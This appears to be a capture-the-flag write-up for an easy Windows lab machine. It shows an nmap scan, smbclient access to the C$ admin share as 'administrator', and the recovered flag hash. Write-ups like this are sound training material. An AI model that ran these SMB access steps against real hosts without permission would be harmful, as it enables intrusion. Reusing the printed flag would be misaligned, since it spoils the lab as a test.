System: Windows
Difficulty: Very Easy

IP Address: 10.129.164.64

# System Flag

NMAP Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.164.64 -sC -sV
```

Those ports have been returned from the command.
```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

After trying multiple users, it is possible to see that  `administrator` is the correct user that have access to shares.
```
kali@kali:~$ smbclient -L 10.129.164.64 -U 'administrator'
```

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

The share `c$` that contain file system directory is accessed.
```
kali@kali:~$ smbclient //10.129.164.64/c$ -U 'administrator'
```

The flag is found in the `C:\Users\administrator\Desktop` directory.
The flag contents is in below.
```
f751c19eda8f61ce81827e6930a1f40c
```